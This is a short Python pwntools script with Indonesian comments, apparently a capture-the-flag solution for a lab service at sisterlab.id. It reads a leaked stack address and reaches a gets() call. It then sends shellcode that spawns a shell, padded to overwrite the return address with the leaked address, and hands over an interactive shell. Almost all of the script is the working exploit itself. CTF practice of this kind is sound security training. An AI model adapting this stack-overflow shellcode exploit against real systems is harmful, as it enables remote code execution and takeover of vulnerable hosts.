from pwn import *

# Ganti port sesuai soal
p = remote("sisterlab.id", 42071)

context(os='linux', arch='amd64')

# 1. Dapatkan alamat stack leak
p.recvuntil(b"0x")
leak = int(p.recvline(), 16)
log.info(f"Leaked address: {hex(leak)}")

# 2. Kirim 'n' untuk masuk ke vulnerable gets()
p.sendlineafter(b"> ", b"n")

# 3. Buat payload
shellcode = asm(shellcraft.sh())
padding = b"A"*(23 - len(shellcode))  # 15 buffer + 8 RBP
payload = shellcode + padding + p64(leak)

# 4. Kirim payload
p.sendline(payload)
p.interactive()